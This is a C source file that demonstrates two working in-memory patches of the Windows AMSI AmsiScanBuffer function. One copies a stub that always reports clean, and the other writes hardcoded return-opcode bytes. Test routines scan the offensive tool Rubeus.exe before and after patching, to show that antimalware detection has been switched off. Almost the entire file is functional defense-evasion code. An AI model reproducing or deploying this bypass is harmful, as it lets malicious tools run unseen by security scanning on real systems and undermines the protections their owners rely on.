#include <Windows.h>
#include <stdio.h>
#include <amsi.h>

#pragma comment(lib, "amsi.lib")

/*
enum AMSI_RESULT {
	AMSI_RESULT_CLEAN = 0,
	AMSI_RESULT_NOT_DETECTED = 1,
	AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
	AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
	AMSI_RESULT_DETECTED = 32768
};


DECLARE_HANDLE(HAMSICONTEXT);
DECLARE_HANDLE(HAMSISESSION);

typedef HRESULT(WINAPI* AmsiInitialize_F)(LPCWSTR, HAMSICONTEXT*);
typedef HRESULT(WINAPI* AmsiOpenSession_F)(HAMSICONTEXT, HAMSISESSION);
typedef BOOL(WINAPI* AmsiScanBuffer_F)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*, AMSI_RESULT);

HMODULE amsiLib = LoadLibraryA("amsi.dll");
	if (amsiLib != NULL) {
		AmsiInitialize_F AmsiInitializeF =(AmsiInitialize_F) GetProcAddress(amsiLib,"AmsiInitialize");
		AmsiOpenSession_F AmsiOpenSessionF =(AmsiOpenSession_F) GetProcAddress(amsiLib,"AmsiOpenSession");
		AmsiScanBuffer_F AmsiScanBufferF =(AmsiScanBuffer_F) GetProcAddress(amsiLib,"AmsiScanBuffer");
	}



*/

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
static HRESULT AmsiScanBufferStub(
	HAMSICONTEXT amsiContext,
	PVOID        buffer,
	ULONG        length,
	LPCWSTR      contentName,
	HAMSISESSION amsiSession,
	AMSI_RESULT* result) {
	*result = AMSI_RESULT_CLEAN;
	return S_OK;
}

static VOID AmsiScanBufferStubEnd(VOID) {}

BOOL DisableAMSI(VOID) {
	BOOL    disabled = FALSE;
	DWORD   len, op, t;

	// load amsi
	HMODULE amsi = LoadLibraryA("amsi");

	if (amsi != NULL) {
		// resolve address of function to patch
		LPVOID cs = GetProcAddress(amsi, "AmsiScanBuffer");

		if (cs != NULL) {
			// calculate length of stub
			len = (ULONG_PTR)AmsiScanBufferStubEnd -
				(ULONG_PTR)AmsiScanBufferStub;

			// make the memory writeable
			if (VirtualProtect(
				cs, len, PAGE_EXECUTE_READWRITE, &op)) {
				// over write with code stub
				memcpy(cs, &AmsiScanBufferStub, len);

				disabled = TRUE;

				// set back to original protection
				VirtualProtect(cs, len, op, &t);
			}
		}
	}
	return disabled;
}
BOOL PatchAMSI(VOID) {
	//PatchAMSI();
	HMODULE amsiLib = LoadLibraryA("amsi.dll");
	if (amsiLib != NULL) {
		BOOL oldProtect;
		VOID* AmsiScanBufferF = (VOID*)GetProcAddress(amsiLib, "AmsiScanBuffer");
		if (AmsiScanBufferF == NULL)
			return FALSE;

#ifdef _M_IX86 
		char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#elif defined(_M_AMD64)
		char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#endif
		// Set region to RWX
		VirtualProtect(AmsiScanBufferF, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);

		CopyMemory(AmsiScanBufferF, patch, sizeof(patch));
		// Retore region to RX
		VirtualProtect(AmsiScanBufferF, sizeof(patch), PAGE_EXECUTE_READ, &oldProtect);
	} else {
		return FALSE;
	}
}

long GetFileSizeF(FILE* pFile) {
	long fileSize;
	fseek(pFile, 0L, SEEK_END);
	fileSize = ftell(pFile);
	fseek(pFile, 0L, SEEK_SET);
	return fileSize;
}
/*
BOOL PatchAMSI() {
	// Patch
	HMODULE amsiLib = LoadLibraryA("amsi.dll");
	if (amsiLib != NULL) {
		BOOL oldProtect;
		typedef BOOL(WINAPI* AmsiScanBuffer_F)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*, AMSI_RESULT);
		AmsiScanBuffer_F AmsiScanBufferF = (AmsiScanBuffer_F)GetProcAddress(amsiLib, "AmsiScanBuffer");

#ifdef _M_IX86 
		char patch[] = { 0x31,0xff,0x90 };
#elif defined(_M_AMD64)
		char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#endif

		// Set region to RWX
		VirtualProtect(AmsiScanBufferF, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);

		CopyMemory(AmsiScanBufferF, patch, sizeof(patch));
		// Retore region to RX
		VirtualProtect(AmsiScanBufferF, sizeof(patch), PAGE_EXECUTE_READ, &oldProtect);
	} else {
		return FALSE;
	}
	return TRUE;
}
*/

BOOL ScanFile(char* filePath, AMSI_RESULT* amsiResult) {
	HAMSICONTEXT amsiContext;
	HAMSISESSION amsiSession;

	AmsiInitialize(L"TestApp", &amsiContext);
	AmsiOpenSession(amsiContext, &amsiSession);

	FILE* pFile;
	long fileSize;
	if (fopen_s(&pFile, "Rubeus.exe", "rb") != 0) {
		printf("[x] Fail to open file Rubeus.exe !");
		system("pause");
		return FALSE;
	}

	fileSize = GetFileSizeF(pFile);

	char* fileBuffer = (char*)calloc(fileSize + 1, sizeof(char*));
	if (fileBuffer == NULL)
		return FALSE;
	fread(fileBuffer, fileSize, sizeof(char*), pFile);

	AmsiScanBuffer(amsiContext, fileBuffer, fileSize, L"Rubeus", amsiSession, amsiResult);

	free(fileBuffer);
	fclose(pFile);

	AmsiCloseSession(amsiContext, amsiSession);
	AmsiUninitialize(amsiContext);
	return TRUE;
}


BOOL testVersion1() {
	AMSI_RESULT amsiResult;

	ScanFile("Rubeus.exe", &amsiResult);

	printf("AmsiScanBuffer: %i\n", amsiResult);

	PatchAMSI();

	ScanFile("Rubeus.exe", &amsiResult);

	printf("AmsiScanBuffer: %i\n", amsiResult);

	return TRUE;
}

BOOL testVersion2() {

	AMSI_RESULT amsiResult;

	ScanFile("Rubeus.exe", &amsiResult);

	printf("AmsiScanBuffer: %i\n", amsiResult);

	DisableAMSI();

	ScanFile("Rubeus.exe", &amsiResult);

	printf("AmsiScanBuffer: %i\n", amsiResult);

	return TRUE;
}



int main() {
	//testVersion1();
	testVersion2();
	system("pause");
	return FALSE;
}